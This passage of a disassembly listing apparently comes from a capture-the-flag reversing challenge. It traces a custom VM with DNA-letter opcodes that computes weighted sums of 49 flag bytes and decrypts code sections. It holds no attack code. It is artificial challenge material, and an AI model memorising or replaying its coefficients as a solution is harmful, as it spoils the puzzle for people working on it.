pop())\n0b188 : GTGAGGGTTTTT     push(mem[#02ae])\n0b194 : TTATTGTTTTTT     push(#00000083)\n0b1a0 : GC               push(pop() * pop())\n0b1a2 : GTAAGGGTTTTT     push(mem[#02af])\n0b1ae : TTCTAATTTTTT     push(#000000f1)\n0b1ba : GC               push(pop() * pop())\n0b1bc : GTTTAGGTTTTT     push(mem[#02b0])\n0b1c8 : TTTCGGTTTTTT     push(#000000a4)\n0b1d4 : GC               push(pop() * pop())\n0b1d6 : TC               push(pop() + pop())\n0b1d8 : TC               push(pop() + pop())\n0b1da : TC               push(pop() + pop())\n0b1dc : TC               push(pop() + pop())\n0b1de : TC               push(pop() + pop())\n0b1e0 : TC               push(pop() + pop())\n0b1e2 : TC               push(pop() + pop())\n0b1e4 : TC               push(pop() + pop())\n0b1e6 : TC               push(pop() + pop())\n0b1e8 : TC               push(pop() + pop())\n0b1ea : TC               push(pop() + pop())\n0b1ec : TC               push(pop() + pop())\n0b1ee : TC               push(pop() + pop())\n0b1f0 : TC               push(pop() + pop())\n0b1f2 : TC               push(pop() + pop())\n0b1f4 : TC               push(pop() + pop())\n0b1f6 : TC               push(pop() + pop())\n0b1f8 : TC               push(pop() + pop())\n0b1fa : TC               push(pop() + pop())\n0b1fc : TC               push(pop() + pop())\n0b1fe : TC               push(pop() + pop())\n0b200 : TC               push(pop() + pop())\n0b202 : TC               push(pop() + pop())\n0b204 : TC               push(pop() + pop())\n0b206 : TC               push(pop() + pop())\n0b208 : TC               push(pop() + pop())\n0b20a : TC               push(pop() + pop())\n0b20c : TC               push(pop() + pop())\n0b20e : TC               push(pop() + pop())\n0b210 : TC               push(pop() + pop())\n0b212 : TC               push(pop() + pop())\n0b214 : TC               push(pop() + pop())\n0b216 : TC               push(pop() + pop())\n0b218 : TC               push(pop() + pop())\n0b21a : TC               push(pop() + pop())\n0b21c : TC               push(pop() + pop())\n0b21e : TC               push(pop() + pop())\n0b220 : TC               push(pop() + pop())\n0b222 : TC               push(pop() + pop())\n0b224 : TC               push(pop() + pop())\n0b226 : TC               push(pop() + pop())\n0b228 : TC               push(pop() + pop())\n0b22a : TC               push(pop() + pop())\n0b22c : TC               push(pop() + pop())\n0b22e : TC               push(pop() + pop())\n0b230 : TC               push(pop() + pop())\n0b232 : TC               push(pop() + pop())\n0b234 : TC               push(pop() + pop())\n0b236 : ATTTTGTTCTTT     mem[#1080] := pop()           memory[#01080] := ((flag[0] * 155) + ((flag[1] * 61) + ((flag[2] * 154) + ((flag[3] * 162) + ((flag[4] * 51) + ((flag[5] * 85) + ((flag[6] * 204) + ((flag[7] * 216) + ((flag[8] * 23) + ((flag[9] * 125) + ((flag[10] * 151) + ((flag[11] * 251) + ((flag[12] * 116) + ((flag[13] * 139) + ((flag[14] * 196) + ((flag[15] * 231) + ((flag[16] * 180) + ((flag[17] * 54) + ((flag[18] * 24) + ((flag[19] * 111) + ((flag[20] * 13) + ((flag[21] * 90) + ((flag[22] * 158) + ((flag[23] * 61) + ((flag[24] * 118) + ((flag[25] * 133) + ((flag[26] * 150) + ((flag[27] * 228) + ((flag[28] * 195) + ((flag[29] * 38) + ((flag[30] * 121) + ((flag[31] * 224) + ((flag[32] * 156) + ((flag[33] * 179) + ((flag[34] * 162) + ((flag[35] * 0) + ((flag[36] * 241) + ((flag[37] * 91) + ((flag[38] * 38) + ((flag[39] * 162) + ((flag[40] * 115) + ((flag[41] * 63) + ((flag[42] * 188) + ((flag[43] * 196) + ((flag[44] * 70) + ((flag[45] * 239) + ((flag[46] * 131) + ((flag[47] * 241) + (flag[48] * 164)))))))))))))))))))))))))))))))))))))))))))))))))\n0b242 : GTGCCGGTTTTT     push(mem[#0296])\n0b24e : CA               exec(pop())                   exec_decrypt(flag[22])\n      ; section at 0b250, coding: [2, 0, 1, 3]\n0b250 : ATTTTAATTTTT     push(mem[#0280])\n0b25c : TTACGATTTTTT     push(#0000009e)\n0b268 : AG               push(pop() * pop())\n0b26a : ATGTTAATTTTT     push(mem[#0281])\n0b276 : TTCAAGTTTTTT     push(#0000006b)\n0b282 : AG               push(pop() * pop())\n0b284 : ATATTAATTTTT     push(mem[#0282])\n0b290 : TTGGCATTTTTT     push(#000000b5)\n0b29c : AG               push(pop() * pop())\n0b29e : ATCTTAATTTTT     push(mem[#0283])\n0b2aa : TTCGAATTTTTT     push(#000000a7)\n0b2b6 : AG               push(pop() * pop())\n0b2b8 : ATTGTAATTTTT     push(mem[#0284])\n0b2c4 : TTATGATTTTTT     push(#00000092)\n0b2d0 : AG               push(pop() * pop())\n0b2d2 : ATGGTAATTTTT     push(mem[#0285])\n0b2de : TTCTGATTTTTT     push(#00000093)\n0b2ea : AG               push(pop() * pop())\n0b2ec : ATAGTAATTTTT     push(mem[#0286])\n0b2f8 : TTTGTGTTTTTT     push(#00000044)\n0b304 : AG               push(pop() * pop())\n0b306 : ATCGTAATTTTT     push(mem[#0287])\n0b312 : TTGGGCTTTTTT     push(#000000d5)\n0b31e : AG               push(pop() * pop())\n0b320 : ATTATAATTTTT     push(mem[#0288])\n0b32c : TTTACATTTTTT     push(#000000b8)\n0b338 : AG               push(pop() * pop())\n0b33a : ATGATAATTTTT     push(mem[#0289])\n0b346 : TTTCCCTTTTTT     push(#000000fc)\n0b352 : AG               push(pop() * pop())\n0b354 : ATAATAATTTTT     push(mem[#028a])\n0b360 : TTTGCTTTTTTT     push(#00000034)\n0b36c : AG               push(pop() * pop())\n0b36e : ATCATAATTTTT     push(mem[#028b])\n0b37a : TTCGAATTTTTT     push(#000000a7)\n0b386 : AG               push(pop() * pop())\n0b388 : ATTCTAATTTTT     push(mem[#028c])\n0b394 : TTAATTTTTTTT     push(#0000000a)\n0b3a0 : AG               push(pop() * pop())\n0b3a2 : ATGCTAATTTTT     push(mem[#028d])\n0b3ae : TTCGGTTTTTTT     push(#00000017)\n0b3ba : AG               push(pop() * pop())\n0b3bc : ATACTAATTTTT     push(mem[#028e])\n0b3c8 : TTCTATTTTTTT     push(#00000023)\n0b3d4 : AG               push(pop() * pop())\n0b3d6 : ATCCTAATTTTT     push(mem[#028f])\n0b3e2 : TTATTTTTTTTT     push(#00000002)\n0b3ee : AG               push(pop() * pop())\n0b3f0 : ATTTGAATTTTT     push(mem[#0290])\n0b3fc : TTAGCATTTTTT     push(#000000b6)\n0b408 : AG               push(pop() * pop())\n0b40a : ATGTGAATTTTT     push(mem[#0291])\n0b416 : TTAGGATTTTTT     push(#00000096)\n0b422 : AG               push(pop() * pop())\n0b424 : ATATGAATTTTT     push(mem[#0292])\n0b430 : TTCGAGTTTTTT     push(#00000067)\n0b43c : AG               push(pop() * pop())\n0b43e : ATCTGAATTTTT     push(mem[#0293])\n0b44a : TTTGTCTTTTTT     push(#000000c4)\n0b456 : AG               push(pop() * pop())\n0b458 : ATTGGAATTTTT     push(mem[#0294])\n0b464 : TTAACTTTTTTT     push(#0000003a)\n0b470 : AG               push(pop() * pop())\n0b472 : ATGGGAATTTTT     push(mem[#0295])\n0b47e : TTTGTATTTTTT     push(#00000084)\n0b48a : AG               push(pop() * pop())\n0b48c : ATAGGAATTTTT     push(mem[#0296])\n0b498 : TTATGATTTTTT     push(#00000092)\n0b4a4 : AG               push(pop() * pop())\n0b4a6 : ATCGGAATTTTT     push(mem[#0297])\n0b4b2 : TTCTCCTTTTTT     push(#000000f3)\n0b4be : AG               push(pop() * pop())\n0b4c0 : ATTAGAATTTTT     push(mem[#0298])\n0b4cc : TTACGCTTTTTT     push(#000000de)\n0b4d8 : AG               push(pop() * pop())\n0b4da : ATGAGAATTTTT     push(mem[#0299])\n0b4e6 : TTTAAGTTTTTT     push(#00000068)\n0b4f2 : AG               push(pop() * pop())\n0b4f4 : ATAAGAATTTTT     push(mem[#029a])\n0b500 : TTCAGTTTTTTT     push(#0000001b)\n0b50c : AG               push(pop() * pop())\n0b50e : ATCAGAATTTTT     push(mem[#029b])\n0b51a : TTCCCTTTTTTT     push(#0000003f)\n0b526 : AG               push(pop() * pop())\n0b528 : ATTCGAATTTTT     push(mem[#029c])\n0b534 : TTTGGCTTTTTT     push(#000000d4)\n0b540 : AG               push(pop() * pop())\n0b542 : ATGCGAATTTTT     push(mem[#029d])\n0b54e : TTTCTGTTTTTT     push(#0000004c)\n0b55a : AG               push(pop() * pop())\n0b55c : ATACGAATTTTT     push(mem[#029e])\n0b568 : TTCTTCTTTTTT     push(#000000c3)\n0b574 : AG               push(pop() * pop())\n0b576 : ATCCGAATTTTT     push(mem[#029f])\n0b582 : TTTCGGTTTTTT     push(#0000005c)\n0b58e : AG               push(pop() * pop())\n0b590 : ATTTAAATTTTT     push(mem[#02a0])\n0b59c : TTTCCATTTTTT     push(#000000bc)\n0b5a8 : AG               push(pop() * pop())\n0b5aa : ATGTAAATTTTT     push(mem[#02a1])\n0b5b6 : TTCAAGTTTTTT     push(#0000006b)\n0b5c2 : AG               push(pop() * pop())\n0b5c4 : ATATAAATTTTT     push(mem[#02a2])\n0b5d0 : TTTCGGTTTTTT     push(#0000005c)\n0b5dc : AG               push(pop() * pop())\n0b5de : ATCTAAATTTTT     push(mem[#02a3])\n0b5ea : TTTTAGTTTTTT     push(#00000060)\n0b5f6 : AG               push(pop() * pop())\n0b5f8 : ATTGAAATTTTT     push(mem[#02a4])\n0b604 : TTGTGATTTTTT     push(#00000091)\n0b610 : AG               push(pop() * pop())\n0b612 : ATGGAAATTTTT     push(mem[#02a5])\n0b61e : TTGCTATTTTTT     push(#0000008d)\n0b62a : AG               push(pop() * pop())\n0b62c : ATAGAAATTTTT     push(mem[#02a6])\n0b638 : TTGTCATTTTTT     push(#000000b1)\n0b644 : AG               push(pop() * pop())\n0b646 : ATCGAAATTTTT     push(mem[#02a7])\n0b652 : TTTCAGTTTTTT     push(#0000006c)\n0b65e : AG               push(pop() * pop())\n0b660 : ATTAAAATTTTT     push(mem[#02a8])\n0b66c : TTACAATTTTTT     push(#000000ae)\n0b678 : AG               push(pop() * pop())\n0b67a : ATGAAAATTTTT     push(mem[#02a9])\n0b686 : TTCGGTTTTTTT     push(#00000017)\n0b692 : AG               push(pop() * pop())\n0b694 : ATAAAAATTTTT     push(mem[#02aa])\n0b6a0 : TTGTGTTTTTTT     push(#00000011)\n0b6ac : AG               push(pop() * pop())\n0b6ae : ATCAAAATTTTT     push(mem[#02ab])\n0b6ba : TTGGACTTTTTT     push(#000000e5)\n0b6c6 : AG               push(pop() * pop())\n0b6c8 : ATTCAAATTTTT     push(mem[#02ac])\n0b6d4 : TTATCATTTTTT     push(#000000b2)\n0b6e0 : AG               push(pop() * pop())\n0b6e2 : ATGCAAATTTTT     push(mem[#02ad])\n0b6ee : TTTTTGTTTTTT     push(#00000040)\n0b6fa : AG               push(pop() * pop())\n0b6fc : ATACAAATTTTT     push(mem[#02ae])\n0b708 : TTGTGCTTTTTT     push(#000000d1)\n0b714 : AG               push(pop() * pop())\n0b716 : ATCCAAATTTTT     push(mem[#02af])\n0b722 : TTTCATTTTTTT     push(#0000002c)\n0b72e : AG               push(pop() * pop())\n0b730 : ATTTCAATTTTT     push(mem[#02b0])\n0b73c : TTACCATTTTTT     push(#000000be)\n0b748 : AG               push(pop() * pop())\n0b74a : TG               push(pop() + pop())\n0b74c : TG               push(pop() + pop())\n0b74e : TG               push(pop() + pop())\n0b750 : TG               push(pop() + pop())\n0b752 : TG               push(pop() + pop())\n0b754 : TG               push(pop() + pop())\n0b756 : TG               push(pop() + pop())\n0b758 : TG               push(pop() + pop())\n0b75a : TG               push(pop() + pop())\n0b75c : TG               push(pop() + pop())\n0b75e : TG               push(pop() + pop())\n0b760 : TG               push(pop() + pop())\n0b762 : TG               push(pop() + pop())\n0b764 : TG               push(pop() + pop())\n0b766 : TG               push(pop() + pop())\n0b768 : TG               push(pop() + pop())\n0b76a : TG               push(pop() + pop())\n0b76c : TG               push(pop() + pop())\n0b76e : TG               push(pop() + pop())\n0b770 : TG               push(pop() + pop())\n0b772 : TG               push(pop() + pop())\n0b774 : TG               push(pop() + pop())\n0b776 : TG               push(pop() + pop())\n0b778 : TG               push(pop() + pop())\n0b77a : TG               push(pop() + pop())\n0b77c : TG               push(pop() + pop())\n0b77e : TG               push(pop() + pop())\n0b780 : TG               push(pop() + pop())\n0b782 : TG               push(pop() + pop())\n0b784 : TG               push(pop() + pop())\n0b786 : TG               push(pop() + pop())\n0b788 : TG               push(pop() + pop())\n0b78a : TG               push(pop() + pop())\n0b78c : TG               push(pop() + pop())\n0b78e : TG               push(pop() + pop())\n0b790 : TG               push(pop() + pop())\n0b792 : TG               push(pop() + pop())\n0b794 : TG               push(pop() + pop())\n0b796 : TG               push(pop() + pop())\n0b798 : TG               push(pop() + pop())\n0b79a : TG               push(pop() + pop())\n0b79c : TG               push(pop() + pop())\n0b79e : TG               push(pop() + pop())\n0b7a0 : TG               push(pop() + pop())\n0b7a2 : TG               push(pop() + pop())\n0b7a4 : TG               push(pop() + pop())\n0b7a6 : TG               push(pop() + pop())\n0b7a8 : TG               push(pop() + pop())\n0b7aa : CTTGTATTGTTT     mem[#1084] := pop()           memory[#01084] := ((flag[0] * 158) + ((flag[1] * 107) + ((flag[2] * 181) + ((flag[3] * 167) + ((flag[4] * 146) + ((flag[5] * 147) + ((flag[6] * 68) + ((flag[7] * 213) + ((flag[8] * 184) + ((flag[9] * 252) + ((flag[10] * 52) + ((flag[11] * 167) + ((flag[12] * 10) + ((flag[13] * 23) + ((flag[14] * 35) + ((flag[15] * 2) + ((flag[16] * 182) + ((flag[17] * 150) + ((flag[18] * 103) + ((flag[19] * 196) + ((flag[20] * 58) + ((flag[21] * 132) + ((flag[22] * 146) + ((flag[23] * 243) + ((flag[24] * 222) + ((flag[25] * 104) + ((flag[26] * 27) + ((flag[27] * 63) + ((flag[28] * 212) + ((flag[29] * 76) + ((flag[30] * 195) + ((flag[31] * 92) + ((flag[32] * 188) + ((flag[33] * 107) + ((flag[34] * 92) + ((flag[35] * 96) + ((flag[36] * 145) + ((flag[37] * 141) + ((flag[38] * 177) + ((flag[39] * 108) + ((flag[40] * 174) + ((flag[41] * 23) + ((flag[42] * 17) + ((flag[43] * 229) + ((flag[44] * 178) + ((flag[45] * 64) + ((flag[46] * 209) + ((flag[47] * 44) + (flag[48] * 190)))))))))))))))))))))))))))))))))))))))))))))))))\n0b7b6 : ATTTTAATTTTT     push(mem[#0280])\n0b7c2 : TTCCGCTTTTTT     push(#000000df)\n0b7ce : AG               push(pop() * pop())\n0b7d0 : ATGTTAATTTTT     push(mem[#0281])\n0b7dc : TTGGTGTTTTTT     push(#00000045)\n0b7e8 : AG               push(pop() * pop())\n0b7ea : ATATTAATTTTT     push(mem[#0282])\n0b7f6 : TTGTTGTTTTTT     push(#00000041)\n0b802 : AG               push(pop() * pop())\n0b804 : ATCTTAATTTTT     push(mem[#0283])\n0b810 : TTTCAGTTTTTT     push(#0000006c)\n0b81c : AG               push(pop() * pop())\n0b81e : ATTGTAATTTTT     push(mem[#0284])\n0b82a : TTCCAGTTTTTT     push(#0000006f)\n0b836 : AG               push(pop() * pop())\n0b838 : ATGGTAATTTTT     push(mem[#0285])\n0b844 : TTGGACTTTTTT     push(#000000e5)\n0b850 : AG               push(pop() * pop())\n0b852 : ATAGTAATTTTT     push(mem[#0286])\n0b85e : TTTAAGTTTTTT     push(#00000068)\n0b86a : AG               push(pop() * pop())\n0b86c : ATCGTAATTTTT     push(mem[#0287])\n0b878 : TTGATCTTTTTT     push(#000000c9)\n0b884 : AG               push(pop() * pop())\n0b886 : ATTATAATTTTT     push(mem[#0288])\n0b892 : TTGAAGTTTTTT     push(#00000069)\n0b89e : AG               push(pop() * pop())\n0b8a0 : ATGATAATTTTT     push(mem[#0289])\n0b8ac : TTTCCATTTTTT     push(#000000bc)\n0b8b8 : AG               push(pop() * pop())\n0b8ba : ATAATAATTTTT     push(mem[#028a])\n0b8c6 : TTGTGGTTTTTT     push(#00000051)\n0b8d2 : AG               push(pop() * pop())\n0b8d4 : ATCATAATTTTT     push(mem[#028b])\n0b8e0 : TTTTTCTTTTTT     push(#000000c0)\n0b8ec : AG               push(pop() * pop())\n0b8ee : ATTCTAATTTTT     push(mem[#028c])\n0b8fa : TTTACTTTTTTT     push(#00000038)\n0b906 : AG               push(pop() * pop())\n0b908 : ATGCTAATTTTT     push(mem[#028d])\n0b914 : TTGGCTTTTTTT     push(#00000035)\n0b920 : AG               push(pop() * pop())\n0b922 : ATACTAATTTTT     push(mem[#028e])\n0b92e : TTATGGTTTTTT     push(#00000052)\n0b93a : AG               push(pop() * pop())\n0b93c : ATCCTAATTTTT     push(mem[#028f])\n0b948 : TTCTGGTTTTTT     push(#00000053)\n0b954 : AG               push(pop() * pop())\n0b956 : ATTTGAATTTTT     push(mem[#0290])\n0b962 : TTGTCCTTTTTT     push(#000000f1)\n0b96e : AG               push(pop() * pop())\n0b970 : ATGTGAATTTTT     push(mem[#0291])\n0b97c : TTCCTTTTTTTT     push(#0000000f)\n0b988 : AG               push(pop() * pop())\n0b98a : ATATGAATTTTT     push(mem[#0292])\n0b996 : TTGTAGTTTTTT     push(#00000061)\n0b9a2 : AG               push(pop() * pop())\n0b9a4 : ATCTGAATTTTT     push(mem[#0293])\n0b9b0 : TTAGAATTTTTT     push(#000000a6)\n0b9bc : AG               push(pop() * pop())\n0b9be : ATTGGAATTTTT     push(mem[#0294])\n0b9ca : TTATTCTTTTTT     push(#000000c2)\n0b9d6 : AG               push(pop() * pop())\n0b9d8 : ATGGGAATTTTT     push(mem[#0295])\n0b9e4 : TTCGGTTTTTTT     push(#00000017)\n0b9f0 : AG               push(pop() * pop())\n0b9f2 : ATAGGAATTTTT     push(mem[#0296])\n0b9fe : TTGTCCTTTTTT     push(#000000f1)\n0ba0a : AG               push(pop() * pop())\n0ba0c : ATCGGAATTTTT     push(mem[#0297])\n0ba18 : TTAGGGTTTTTT     push(#00000056)\n0ba24 : AG               push(pop() * pop())\n0ba26 : ATTAGAATTTTT     push(mem[#0298])\n0ba32 : TTTATGTTTTTT     push(#00000048)\n0ba3e : AG               push(pop() * pop())\n0ba40 : ATGAGAATTTTT     push(mem[#0299])\n0ba4c : TTGCTATTTTTT     push(#0000008d)\n0ba58 : AG               push(pop() * pop())\n0ba5a : ATAAGAATTTTT     push(mem[#029a])\n0ba66 : TTTGCGTTTTTT     push(#00000074)\n0ba72 : AG               push(pop() * pop())\n0ba74 : ATCAGAATTTTT     push(mem[#029b])\n0ba80 : TTAGGGTTTTTT     push(#00000056)\n0ba8c : AG               push(pop() * pop())\n0ba8e : ATTCGAATTTTT     push(mem[#029c])\n0ba9a : TTGGGTTTTTTT     push(#00000015)\n0baa6 : AG               push(pop() * pop())\n0baa8 : ATGCGAATTTTT     push(mem[#029d])\n0bab4 : TTTGTGTTTTTT     push(#00000044)\n0bac0 : AG               push(pop() * pop())\n0bac2 : ATACGAATTTTT     push(mem[#029e])\n0bace : TTAGCTTTTTTT     push(#00000036)\n0bada : AG               push(pop() * pop())\n0badc : ATCCGAATTTTT     push(mem[#029f])\n0bae8 : TTGCACTTTTTT     push(#000000ed)\n0baf4 : AG               push(pop() * pop())\n0baf6 : ATTTAAATTTTT     push(mem[#02a0])\n0bb02 : TTTTAGTTTTTT     push(#00000060)\n0bb0e : AG               push(pop() * pop())\n0bb10 : ATGTAAATTTTT     push(mem[#02a1])\n0bb1c : TTATTGTTTTTT     push(#00000042)\n0bb28 : AG               push(pop() * pop())\n0bb2a : ATATAAATTTTT     push(mem[#02a2])\n0bb36 : TTTTCCTTTTTT     push(#000000f0)\n0bb42 : AG               push(pop() * pop())\n0bb44 : ATCTAAATTTTT     push(mem[#02a3])\n0bb50 : TTCATTTTTTTT     push(#0000000b)\n0bb5c : AG               push(pop() * pop())\n0bb5e : ATTGAAATTTTT     push(mem[#02a4])\n0bb6a : TTGGCTTTTTTT     push(#00000035)\n0bb76 : AG               push(pop() * pop())\n0bb78 : ATGGAAATTTTT     push(mem[#02a5])\n0bb84 : TTCGCGTTTTTT     push(#00000077)\n0bb90 : AG               push(pop() * pop())\n0bb92 : ATAGAAATTTTT     push(mem[#02a6])\n0bb9e : TTCGATTTTTTT     push(#00000027)\n0bbaa : AG               push(pop() * pop())\n0bbac : ATCGAAATTTTT     push(mem[#02a7])\n0bbb8 : TTCCCTTTTTTT     push(#0000003f)\n0bbc4 : AG               push(pop() * pop())\n0bbc6 : ATTAAAATTTTT     push(mem[#02a8])\n0bbd2 : TTCATATTTTTT     push(#0000008b)\n0bbde : AG               push(pop() * pop())\n0bbe0 : ATGAAAATTTTT     push(mem[#02a9])\n0bbec : TTTGCATTTTTT     push(#000000b4)\n0bbf8 : AG               push(pop() * pop())\n0bbfa : ATAAAAATTTTT     push(mem[#02aa])\n0bc06 : TTCTGTTTTTTT     push(#00000013)\n0bc12 : AG               push(pop() * pop())\n0bc14 : ATCAAAATTTTT     push(mem[#02ab])\n0bc20 : TTAATCTTTTTT     push(#000000ca)\n0bc2c : AG               push(pop() * pop())\n0bc2e : ATTCAAATTTTT     push(mem[#02ac])\n0bc3a : TTCGGTTTTTTT     push(#00000017)\n0bc46 : AG               push(pop() * pop())\n0bc48 : ATGCAAATTTTT     push(mem[#02ad])\n0bc54 : TTCCTTTTTTTT     push(#0000000f)\n0bc60 : AG               push(pop() * pop())\n0bc62 : ATACAAATTTTT     push(mem[#02ae])\n0bc6e : TTCTTCTTTTTT     push(#000000c3)\n0bc7a : AG               push(pop() * pop())\n0bc7c : ATCCAAATTTTT     push(mem[#02af])\n0bc88 : TTCACGTTTTTT     push(#0000007b)\n0bc94 : AG               push(pop() * pop())\n0bc96 : ATTTCAATTTTT     push(mem[#02b0])\n0bca2 : TTTGCTTTTTTT     push(#00000034)\n0bcae : AG               push(pop() * pop())\n0bcb0 : TG               push(pop() + pop())\n0bcb2 : TG               push(pop() + pop())\n0bcb4 : TG               push(pop() + pop())\n0bcb6 : TG               push(pop() + pop())\n0bcb8 : TG               push(pop() + pop())\n0bcba : TG               push(pop() + pop())\n0bcbc : TG               push(pop() + pop())\n0bcbe : TG               push(pop() + pop())\n0bcc0 : TG               push(pop() + pop())\n0bcc2 : TG               push(pop() + pop())\n0bcc4 : TG               push(pop() + pop())\n0bcc6 : TG               push(pop() + pop())\n0bcc8 : TG               push(pop() + pop())\n0bcca : TG               push(pop() + pop())\n0bccc : TG               push(pop() + pop())\n0bcce : TG               push(pop() + pop())\n0bcd0 : TG               push(pop() + pop())\n0bcd2 : TG               push(pop() + pop())\n0bcd4 : TG               push(pop() + pop())\n0bcd6 : TG               push(pop() + pop())\n0bcd8 : TG               push(pop() + pop())\n0bcda : TG               push(pop() + pop())\n0bcdc : TG               push(pop() + pop())\n0bcde : TG               push(pop() + pop())\n0bce0 : TG               push(pop() + pop())\n0bce2 : TG               push(pop() + pop())\n0bce4 : TG               push(pop() + pop())\n0bce6 : TG               push(pop() + pop())\n0bce8 : TG               push(pop() + pop())\n0bcea : TG               push(pop() + pop())\n0bcec : TG               push(pop() + pop())\n0bcee : TG               push(pop() + pop())\n0bcf0 : TG               push(pop() + pop())\n0bcf2 : TG               push(pop() + pop())\n0bcf4 : TG               push(pop() + pop())\n0bcf6 : TG               push(pop() + pop())\n0bcf8 : TG               push(pop() + pop())\n0bcfa : TG               push(pop() + pop())\n0bcfc : TG               push(pop() + pop())\n0bcfe : TG               push(pop() + pop())\n0bd00 : TG               push(pop() + pop())\n0bd02 : TG               push(pop() + pop())\n0bd04 : TG               push(pop() + pop())\n0bd06 : TG               push(pop() + pop())\n0bd08 : TG               push(pop() + pop())\n0bd0a : TG               push(pop() + pop())\n0bd0c : TG               push(pop() + pop())\n0bd0e : TG               push(pop() + pop())\n0bd10 : CTTATATTGTTT     mem[#1088] := pop()           memory[#01088] := ((flag[0] * 223) + ((flag[1] * 69) + ((flag[2] * 65) + ((flag[3] * 108) + ((flag[4] * 111) + ((flag[5] * 229) + ((flag[6] * 104) + ((flag[7] * 201) + ((flag[8] * 105) + ((flag[9] * 188) + ((flag[10] * 81) + ((flag[11] * 192) + ((flag[12] * 56) + ((flag[13] * 53) + ((flag[14] * 82) + ((flag[15] * 83) + ((flag[16] * 241) + ((flag[17] * 15) + ((flag[18] * 97) + ((flag[19] * 166) + ((flag[20] * 194) + ((flag[21] * 23) + ((flag[22] * 241) + ((flag[23] * 86) + ((flag[24] * 72) + ((flag[25] * 141) + ((flag[26] * 116) + ((flag[27] * 86) + ((flag[28] * 21) + ((flag[29] * 68) + ((flag[30] * 54) + ((flag[31] * 237) + ((flag[32] * 96) + ((flag[33] * 66) + ((flag[34] * 240) + ((flag[35] * 11) + ((flag[36] * 53) + ((flag[37] * 119) + ((flag[38] * 39) + ((flag[39] * 63) + ((flag[40] * 139) + ((flag[41] * 180) + ((flag[42] * 19) + ((flag[43] * 202) + ((flag[44] * 23) + ((flag[45] * 15) + ((flag[46] * 195) + ((flag[47] * 123) + (flag[48] * 52)))))))))))))))))))))))))))))))))))))))))))))))))\n0bd1c : ATTTTAATTTTT     push(mem[#0280])\n0bd28 : TTGCGATTTTTT     push(#0000009d)\n0bd34 : AG               push(pop() * pop())\n0bd36 : ATGTTAATTTTT     push(mem[#0281])\n0bd42 : TTGTCATTTTTT     push(#000000b1)\n0bd4e : AG               push(pop() * pop())\n0bd50 : ATATTAATTTTT     push(mem[#0282])\n0bd5c : TTGTTATTTTTT     push(#00000081)\n0bd68 : AG               push(pop() * pop())\n0bd6a : ATCTTAATTTTT     push(mem[#0283])\n0bd76 : TTACGTTTTTTT     push(#0000001e)\n0bd82 : AG               push(pop() * pop())\n0bd84 : ATTGTAATTTTT     push(mem[#0284])\n0bd90 : TTTACCTTTTTT     push(#000000f8)\n0bd9c : AG               push(pop() * pop())\n0bd9e : ATGGTAATTTTT     push(mem[#0285])\n0bdaa : TTGCTATTTTTT     push(#0000008d)\n0bdb6 : AG               push(pop() * pop())\n0bdb8 : ATAGTAATTTTT     push(mem[#0286])\n0bdc4 : TTGGCCTTTTTT     push(#000000f5)\n0bdd0 : AG               push(pop() * pop())\n0bdd2 : ATCGTAATTTTT     push(mem[#0287])\n0bdde : TTCCCCTTTTTT     push(#000000ff)\n0bdea : AG               push(pop() * pop())\n0bdec : ATTATAATTTTT     push(mem[#0288])\n0bdf8 : TTCTGTTTTTTT     push(#00000013)\n0be04 : AG               push(pop() * pop())\n0be06 : ATGATAATTTTT     push(mem[#0289])\n0be12 : TTCAGGTTTTTT     push(#0000005b)\n0be1e : AG               push(pop() * pop())\n0be20 : ATAATAATTTTT     push(mem[#028a])\n0be2c : TTGACCTTTTTT     push(#000000f9)\n0be38 : AG               push(pop() * pop())\n0be3a : ATCATAATTTTT     push(mem[#028b])\n0be46 : TTTGCTTTTTTT     push(#00000034)\n0be52 : AG               push(pop() * pop())\n0be54 : ATTCTAATTTTT     push(mem[#028c])\n0be60 : TTCTTTTTTTTT     push(#00000003)\n0be6c : AG               push(pop() * pop())\n0be6e : ATGCTAATTTTT     push(mem[#028d])\n0be7a : TTCTGCTTTTTT     push(#000000d3)\n0be86 : AG               push(pop() * pop())\n0be88 : ATACTAATTTTT     push(mem[#028e])\n0be94 : TTGTACTTTTTT     push(#000000e1)\n0bea0 : AG               push(pop() * pop())\n0bea2 : ATCCTAATTTTT     push(mem[#028f])\n0beae : TTATGGTTTTTT     push(#00000052)\n0beba : AG               push(pop() * pop())\n0bebc : ATTTGAATTTTT     push(mem[#0290])\n0bec8 : TTACTATTTTTT     push(#0000008e)\n0bed4 : AG               push(pop() * pop())\n0bed6 : ATGTGAATTTTT     push(mem[#0291])\n0bee2 : TTTGGCTTTTTT     push(#000000d4)\n0beee : AG               push(pop() * pop())\n0bef0 : ATATGAATTTTT     push(mem[#0292])\n0befc : TTTATGTTTTTT     push(#00000048)\n0bf08 : AG               push(pop() * pop())\n0bf0a : ATCTGAATTTTT     push(mem[#0293])\n0bf16 : TTCCGCTTTTTT     push(#000000df)\n0bf22 : AG               push(pop() * pop())\n0bf24 : ATTGGAATTTTT     push(mem[#0294])\n0bf30 : TTCCAATTTTTT     push(#000000af)\n0bf3c : AG               push(pop() * pop())\n0bf3e : ATGGGAATTTTT     push(mem[#0295])\n0bf4a : TTCAGCTTTTTT     push(#000000db)\n0bf56 : AG               push(pop() * pop())\n0bf58 : ATAGGAATTTTT     push(mem[#0296])\n0bf64 : TTAGGTTTTTTT     push(#00000016)\n0bf70 : AG               push(pop() * pop())\n0bf72 : ATCGGAATTTTT     push(mem[#0297])\n0bf7e : TTCTGCTTTTTT     push(#000000d3)\n0bf8a : AG               push(pop() * pop())\n0bf8c : ATTAGAATTTTT     push(mem[#0298])\n0bf98 : TTAACCTTTTTT     push(#000000fa)\n0bfa4 : AG               push(pop() * pop())\n0bfa6 : ATGAGAATTTTT     push(mem[#0299])\n0bfb2 : TTGACGTTTTTT     push(#00000079)\n0bfbe : AG               push(pop() * pop())\n0bfc0 : ATAAGAATTTTT     push(mem[#029a])\n0bfcc : TTGTGCTTTTTT     push(#000000d1)\n0bfd8 : AG               push(pop() * pop())\n0bfda : ATCAGAATTTTT     push(mem[#029b])\n0bfe6 : TTGCATTTTTTT     push(#0000002d)\n0bff2 : AG               push(pop() * pop())\n0bff4 : ATTCGAATTTTT     push(mem[#029c])\n0c000 : TTAGTGTTTTTT     push(#00000046)\n0c00c : AG               push(pop() * pop())\n0c00e : ATGCGAATTTTT     push(mem[#029d])\n0c01a : TTTTTATTTTTT     push(#00000080)\n0c026 : AG               push(pop() * pop())\n0c028 : ATACGAATTTTT     push(mem[#029e])\n0c034 : TTTTGCTTTTTT     push(#000000d0)\n0c040 : AG               push(pop() * pop())\n0c042 : ATCCGAATTTTT     push(mem[#029f])\n0c04e : TTAGTGTTTTTT     